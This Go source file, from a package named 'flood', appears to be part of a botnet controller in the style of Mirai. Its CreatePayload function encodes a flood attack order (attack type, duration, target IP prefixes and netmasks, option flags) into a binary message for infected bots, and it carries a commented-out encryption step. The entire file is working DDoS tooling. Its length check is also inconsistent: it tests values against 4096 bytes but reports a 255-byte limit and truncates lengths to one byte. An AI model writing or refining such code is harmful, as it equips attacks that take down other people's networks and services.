package flood

import (
	"encoding/binary"
	"errors"
)

func (attack *AttackProfile) CreatePayload() ([]byte, error) {
	buf := make([]byte, 0)
	var tmp []byte

	// Add in attack type
	buf = append(buf, byte(attack.Id))

	tmp = make([]byte, 2)
	binary.BigEndian.PutUint16(tmp, uint16(attack.Duration))
	buf = append(buf, tmp...)

	// Send number of targets
	buf = append(buf, byte(len(attack.Targets)))

	// Send targets
	for prefix, netmask := range attack.Targets {
		tmp = make([]byte, 5)
		binary.BigEndian.PutUint32(tmp, prefix)
		tmp[4] = byte(netmask)
		buf = append(buf, tmp...)
	}

	// Send number of flags
	buf = append(buf, byte(len(attack.Options)))

	// Send flags
	for key, val := range attack.Options {
		tmp = make([]byte, 2)
		tmp[0] = key
		strBuf := []byte(val)
		if len(strBuf) > 4096 {
			return nil, errors.New("flag value can't be more than 255 bytes")
		}
		tmp[1] = uint8(len(strBuf))
		tmp = append(tmp, strBuf...)
		buf = append(buf, tmp...)
	}

	// Specify the total length
	if len(buf) > 4096 {
		return nil, errors.New("max buffer is 4096")
	}

	//	encryption.Chacha20(encryption.Key, 1, encryption.Nonce, buf, buf)

	tmp = make([]byte, 2)
	binary.BigEndian.PutUint16(tmp, uint16(len(buf)+2))
	buf = append(tmp, buf...)
	return buf, nil
}
